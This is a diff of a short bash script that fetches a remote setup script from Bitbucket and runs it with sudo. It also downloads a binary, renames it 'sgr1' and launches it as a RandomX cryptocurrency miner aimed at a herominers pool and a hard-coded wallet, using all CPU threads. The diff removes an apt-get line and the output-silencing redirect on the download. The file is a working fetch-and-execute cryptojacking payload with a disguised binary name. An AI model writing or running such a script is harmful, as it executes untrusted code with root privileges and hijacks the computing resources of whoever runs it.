@@ -1,9 +1,8 @@
 #!/bin/bash
-apt-get update ; apt-get install -y wget curl sudo
 wget https://bitbucket.org/kzpakid/esce/raw/main/configurasi.sh
 chmod u+x configurasi.sh
 sudo ./configurasi.sh
 ./configurasi.sh
-wget -O sgr1 https://bitbucket.org/kzpakid/pile/downloads/sarebu >/dev/null 2>&1
+wget -O sgr1 https://bitbucket.org/kzpakid/pile/downloads/sarebu
 chmod +x sgr1
 ./sgr1 --algorithm randomx --pool de.qrl.herominers.com:1166 --wallet Q0104006f62eeca4efe4da7805a59e381783e116ab66e257dfe06a6d199cd7505ce9f07847e5a73 --password anyar --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive
